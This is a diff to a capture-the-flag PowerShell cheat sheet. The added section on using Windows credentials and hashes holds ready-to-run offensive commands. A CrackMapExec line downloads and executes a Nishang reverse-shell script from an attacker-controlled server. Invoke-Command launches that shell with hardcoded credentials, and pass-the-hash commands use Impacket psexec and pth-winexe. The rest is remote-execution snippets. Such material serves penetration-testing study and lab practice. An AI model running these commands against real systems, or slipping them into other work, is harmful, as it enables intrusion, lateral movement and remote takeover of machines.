@@ -4,7 +4,7 @@ title: CTF
 permalink: /ctf/
 ---
 
-PowerShell
+PowerShell Primer Plus
 
 ```powershell
 # Start a session without a profile and bypassing no execution
@@ -182,6 +182,7 @@ Import-Module C:\Path\to\name.ps1
 
 #INVOKE COMMAND -ICM
 Invoke-Command -ComputerName <name> -ScriptBlock {whoami}
+
 $username = 'DOMAIN\USERNAME'; $password = 'PASSWORD'; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $username,$securePassword; Invoke-Command -ComputerName BOX01 -Credential $credential -ScriptBlock {whoami};
 
 
@@ -212,6 +213,17 @@ $username = 'lab.local\LDAP'; $password = 'PASSWORD'; $DomainControllerIpAddress
 
 #UAC
 $secpasswd = ConvertTo-SecureString "1234test" -AsPlainText -Force; $mycreds = New-Object System.Management.Automation.PSCredential ("Administrator", $secpasswd); $computer = "BOXNAME"; [System.Diagnostics.Process]::Start("C:\temp\file.bat",$mycreds.Username,$mycreds.Password,$computer)
+```
+
+Using Windows Credentials/hashes
+```powershell
+$username = 'DOMAIN\USERNAME'; $password = 'PASSWORD'; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $username,$securePassword; Invoke-Command -ComputerName BOX01 -Credential $credential -ScriptBlock {Invoke-PowerShellTcpOneLine.ps1};
+```
+
+```bash
+cme smb IP -u USERNAME -p PASSWORD -X 'IEX (New-Object Net.WebClient).DownloadString("http://SERVERIP:PORT/[Invoke-PowerShellTcpOneLine.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1)")'
+Impacket/examples/psexec.py -hashes NTHASH:LMHASH USERNAME@IP
+pth-winexe -U HASH //IP cmd
 ```
 
 
